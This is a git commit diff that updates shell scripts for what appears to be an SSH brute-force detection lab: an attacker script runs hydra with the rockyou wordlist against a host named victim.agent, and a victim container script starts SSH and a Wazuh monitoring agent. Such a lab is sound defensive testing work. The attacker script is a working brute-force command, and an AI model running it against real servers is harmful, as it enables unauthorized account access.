d17d1539039e342d33f1d6922e08e8c89ee5042a
Julia Bajor <juliabajor@onet.pl>
2025-04-14 20:47:51 +0200

    update .sh files

--- attacker/attack.sh
+++ attacker/attack.sh
@@ -1,5 +1,13 @@
-#!/bin/bash
 
-echo "[*] Atak na SSH na victim.agent..."
+echo "[*] Rozpoczęcie ataku brute-force na usługę SSH hosta victim.agent..."
 
-hydra -l victim -P /usr/share/wordlists/rockyou.txt ssh://victim.agent -t 4 -f
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+if [[ ! -f "$WORDLIST" ]]; then
+    echo "[!] Lista haseł nie została znaleziona: $WORDLIST"
+    exit 1
+fi
+
+hydra -l victim -P "$WORDLIST" ssh://victim.agent -t 4 -f
+
+echo "[*] Atak zakończony."
--- victim/entrypoint.sh
+++ victim/entrypoint.sh
@@ -1,10 +1,11 @@
 #!/bin/bash
 
 
-# adres menagera
+# konfiguracja adresu wazuh managera w agencie
 sed -i "s|<address>.*</address>|<address>${WAZUH_MANAGER}</address>|" /var/ossec/etc/ossec.conf
-# Start SSH
+# Start SSH i agenta wazuh
 service ssh start
 /var/ossec/bin/wazuh-control start
+
 # nieskonczona petla do podtrzymania kontenera
 tail -f /dev/null
